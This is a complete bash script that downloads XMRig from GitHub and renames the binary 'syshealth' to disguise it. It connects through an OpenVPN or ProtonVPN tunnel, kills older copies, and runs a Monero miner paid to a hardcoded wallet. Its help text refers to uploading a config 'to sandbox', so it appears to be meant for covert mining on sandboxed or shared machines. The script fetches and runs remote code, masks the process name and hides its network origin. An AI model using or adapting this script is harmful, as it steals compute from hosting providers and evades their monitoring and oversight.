#!/bin/bash
# vpn-mine.sh - Mine using ProtonVPN or any OpenVPN config
# Usage: bash vpn-mine.sh [path-to-ovpn-config]

WALLET="49J8k2f3qtHaNYcQ52WXkHZgWhU4dU8fuhRJcNiG9Bra3uyc2pQRsmR38mqkh2MZhEfvhkh2bNkzR892APqs3U6aHsBcN1F"
POOL_URL="pool.supportxmr.com:443"
OVPN_CONFIG="${1:-/root/proton.ovpn}"  # Default to /root/proton.ovpn
WORKER_NAME="worker-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"

set -e
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Install dependencies
echo "Installing OpenVPN..."
apt-get update >/dev/null 2>&1 && apt-get install -y openvpn curl >/dev/null 2>&1 || \
sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y openvpn curl >/dev/null 2>&1

# Download miner if needed
if [ ! -f "$SCRIPT_DIR/syshealth" ]; then
  echo "Downloading XMRig..."
  curl -sL https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz -C /tmp
  mv /tmp/xmrig-6.21.0/xmrig "$SCRIPT_DIR/syshealth"
  chmod +x "$SCRIPT_DIR/syshealth"
  rm -rf /tmp/xmrig-*
fi

# Check if VPN config exists
if [ ! -f "$OVPN_CONFIG" ]; then
  echo "ERROR: VPN config not found at $OVPN_CONFIG"
  echo ""
  echo "To use ProtonVPN:"
  echo "1. Sign up: https://account.protonvpn.com/signup"
  echo "2. Download config: https://account.protonvpn.com/downloads"
  echo "3. Upload .ovpn file to sandbox and run:"
  echo "   bash vpn-mine.sh /path/to/config.ovpn"
  exit 1
fi

# Start VPN in background
echo "Connecting to VPN..."
nohup openvpn --config "$OVPN_CONFIG" --daemon > /tmp/vpn.log 2>&1 &
sleep 10

# Check if connected
if ! ip a show tun0 >/dev/null 2>&1; then
  echo "ERROR: VPN not connected. Check /tmp/vpn.log"
  tail -20 /tmp/vpn.log
  exit 1
fi

# Get VPN IP
VPN_IP=$(curl -s --max-time 5 https://api.ipify.org || echo "unknown")
echo "Connected! VPN IP: $VPN_IP"

# Create miner config
cat > "$SCRIPT_DIR/config.json" <<EOF
{
  "autosave": true,
  "cpu": {"enabled": true, "huge-pages": true, "max-threads-hint": 100},
  "pools": [{
    "url": "$POOL_URL",
    "user": "$WALLET.$WORKER_NAME",
    "pass": "x",
    "rig-id": "$WORKER_NAME",
    "keepalive": true,
    "tls": true
  }],
  "donate-level": 0
}
EOF

# Kill old miners
pkill -9 syshealth 2>/dev/null || true

# Start miner
echo "Starting miner..."
nohup "$SCRIPT_DIR/syshealth" -c "$SCRIPT_DIR/config.json" > "$SCRIPT_DIR/xmrig.log" 2>&1 &
sleep 3

if pgrep -f syshealth >/dev/null; then
  echo "========================================"
  echo "  ✓ Mining via VPN!"
  echo "========================================"
  echo "Pool:    $POOL_URL"
  echo "Worker:  $WORKER_NAME"
  echo "VPN IP:  $VPN_IP"
  echo "Log:     $SCRIPT_DIR/xmrig.log"
  echo ""
  echo "Monitor: tail -f $SCRIPT_DIR/xmrig.log"
  echo "========================================"
else
  echo "ERROR: Miner failed to start"
  cat "$SCRIPT_DIR/xmrig.log"
fi
